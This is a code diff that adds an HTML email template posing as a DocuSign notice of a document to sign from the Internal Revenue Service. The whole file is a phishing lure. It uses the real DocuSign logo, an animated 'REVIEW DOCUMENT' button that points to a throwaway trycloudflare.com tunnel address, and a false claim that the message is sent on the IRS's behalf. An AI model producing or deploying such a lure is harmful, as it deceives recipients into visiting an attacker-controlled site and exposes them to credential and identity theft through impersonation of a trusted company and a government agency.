@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>DocuSign Notification</title>
+    <style>
+      @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(0,112,210, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(0,112,210, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(0,112,210, 0); }
+      }
+      .pulse-button {
+        background-color: #0070d2;
+        color: white;
+        padding: 12px 24px;
+        text-decoration: none;
+        border-radius: 5px;
+        font-weight: bold;
+        display: inline-block;
+        animation: pulse 2s infinite;
+      }
+      .icon {
+        width: 40px;
+        vertical-align: middle;
+        margin-right: 10px;
+      }
+    </style>
+  </head>
+  <body style="font-family: Arial, sans-serif; background-color: #f0f0f0; padding: 20px;">
+    <table width="100%" style="max-width: 600px; margin: auto; background-color: white; border: 1px solid #ddd; padding: 20px;">
+      <tr>
+        <td align="center">
+          <img src="https://www.docusign.com/sites/default/files/logo_0.png" alt="DocuSign Logo" width="140">
+        </td>
+      </tr>
+      <tr>
+        <td style="padding-top: 20px;">
+          <p style="color: #333; font-size: 16px;">
+            <img class="icon" src="https://cdn-icons-png.flaticon.com/512/2936/2936639.png" alt="Document Icon">
+            You've received a document to sign from <strong>Internal Revenue Service</strong>.
+          </p>
+          <p style="color: #666; font-size: 15px;">To review and sign the document, please click the button below.</p>
+          <div style="text-align: center; margin: 30px 0;">
+            <a href="https://pictures-colleges-roman-cyber.trycloudflare.com" class="pulse-button">REVIEW DOCUMENT</a>
+          </div>
+          <p style="font-size: 12px; color: #aaa;">
+            DocuSign is the most secure and widely used eSignature solution. This message was sent to you on behalf of the IRS.
+          </p>
+        </td>
+      </tr>
+    </table>
+  </body>
+</html>
